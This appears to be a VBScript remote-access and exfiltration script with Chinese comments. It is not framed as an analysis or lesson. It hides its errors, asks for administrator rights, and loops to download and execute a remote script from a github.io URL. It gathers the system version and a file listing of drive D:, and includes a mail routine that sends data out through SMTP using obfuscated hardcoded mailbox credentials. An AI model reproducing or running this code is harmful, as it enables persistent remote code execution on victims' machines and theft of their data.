On Error Resume Next
set ws=createobject("wscript.shell") 
if vbsmain=1 then
	vsion="2022311？　！！"
	slptime=20*1000
	place=createobject("Scripting.FileSystemObject").GetFile(Wscript.ScriptFullName).ParentFolder.Path
	do
		dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") 
		dim bStrm: Set bStrm = createobject("Adodb.Stream") 
		xHttp.Open "GET", "https://wzj-901.github.io/food0.vbs", False 
		xHttp.Send 

		with bStrm 
			.type = 1 
			.open 
			.write xHttp.responseBody 
			.savetofile place & "/temp.vbs", 2 
		end with 
		execute(fread(place & "/temp.vbs"))
		
		if exist1 then
			exit do
		end if
		wscript.sleep slptime
	loop
	
else
	x=admin()
	exist0=false
	exist1=false
	exist2=false
	do
		vbsmain=1
		fullname=wscript.ScriptFullName
		maincode=fread(fullname)
		execute maincode
		if exist0 then
			exit do
		end if
		wscript.sleep 30*1000
	loop
end if

'函数
Function fwrite(fname,fcode)
	Set f = CreateObject("scripting.filesystemobject").createtextfile(fname,2)
	f.writeline(fcode)
	f.close
End Function
Function fread(readfilepath)
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set file = fs.OpenTextFile(readfilepath, 1, false)
    fread=file.readall
    file.close
    set fs=nothing
end Function
Function admin()
	set ws=createobject("wscript.shell") 
	Set WshShell = WScript.CreateObject("WScript.Shell") 
	If WScript.Arguments.Length = 0 Then
	  Set ObjShell = CreateObject("Shell.Application") 
	  ObjShell.ShellExecute "wscript.exe" _ 
	  , """" & WScript.ScriptFullName & """ RunAsAdministrator", , "runas", 1 
	  WScript.Quit 
	End if
End Function

function upvsion(nvsion)
	dim w1
	w1=fread(fullname)
	w1=deal0(w1)
	w2=replace(w1,"""" & vsion & """","""" & nvsion & """")
	c=fwrite(fullname,w2)
	vsion=nvsion
end function

Function list2(folderspec)
    Dim f, f1, fc, s ,N ,s1 ,s2 ,s3,N2 ,s21 ,s22 ,s23,k
    Set f = fso.GetFolder(folderspec)
    Set fc = f.Files
    Set fc2 = f.SubFolders
    N = 0
    For Each f1 In fc
        If f1.name <> "desktop.ini" Then
            N = N + 1
            s1 = s & f1.name
            s2 = "  " & N & " ：" & s1 & vbCrLf
            s3 = s3 + s2
        End If
    Next
    N2 = 0
    For Each f1 In fc2
        N2 = N2 + 1
        s21 = s & f1.path
        s22 = "  " & N2 & " ：" & s21 & vbCrLf
        s23 = s23 + s22
    Next
    list2 = folderspec & " 中总共有 " & N & " 个文件：" & vbCrLf & s3 & vbCrLf & vbCrLf & folderspec & " 中总共有 " & N2 & " 个文件夹：" & vbCrLf & s23
End Function
Function list(wjian)
    On Error Resume Next
    Dim wenjian2
    wenjian2 = list2(wjian)
    If CBool(wenjian2) Then
    Else
        wenjian2 = wjian & " 访问失败！" & vbCrLf & "错误原因：" & Err.Description
    End If
    Err.clear
    'On Error GoTo 0
    list = wenjian2
End Function

Function sys()
    Dim sy
    sy = "系统版本："
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:" _
     & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
    Set colOperatingSystems = objWMIService.ExecQuery _
    ("Select * from Win32_OperatingSystem")
    For Each objOperatingSystem In colOperatingSystems
        sy = sy & vbCrLf & objOperatingSystem.Caption & " " & objOperatingSystem.Version
    Next
    sys = sy
End Function

function tnow()
	tnow=date()&" " & Hour(Now)&":"&Minute(Now)&":"&Second(Now)
end function
function data0()
	vsion = sys()
	wenjian = list("d:\")
	data0 = tnow & vbcrlf & vbcrlf & vsion & vbCrLf & vbCrLf & wenjian
end function
function Send_mail(YA,YP,SE,SE2,Send_Topic,Send_Body,Send_Attachment) 
	On Error Resume Next 
	Err.Clear  
	YA=YA & "0@163.com"
	YP="HJYEP" & YP & "VMTSOU"
	SE=SE & "0646391@qq.com"
	You_ID=Split(YA, "@", -1, vbTextCompare)  
	MS_Space = "http://schemas.microsoft.com/cdo/configuration/"  
	Set Email = CreateObject("CDO.Message")  
	Email.From = YA  
	Email.To = SE  
	If SE2 <> "" Then  
	Email.CC = SE2  
	End If  
	Email.Subject = Send_Topic  
	Email.Textbody = Send_Body  
	If Send_Attachment <> "" Then  
	Email.AddAttachment Send_Attachment  
	End If  
	With Email.Configuration.Fields  
	.Item(MS_Space&"sendusing") = 2  
	.Item(MS_Space&"smtpserver") = "smtp."&You_ID(1)  
	.Item(MS_Space&"smtpserverport") = 25
	.Item(MS_Space&"smtpauthenticate") = 1  
	.Item(MS_Space&"sendusername") = You_ID(0)  
	.Item(MS_Space&"sendpassword") = YP  
	.Update  
	End With  
	Email.Send  
	Set Email=Nothing  
	Send_Mail=True  
	If Err.number <> 0 Then  
	Err.Clear  
	Send_Mail=False  
    'On Error GoTo 0
	End If  
End Function









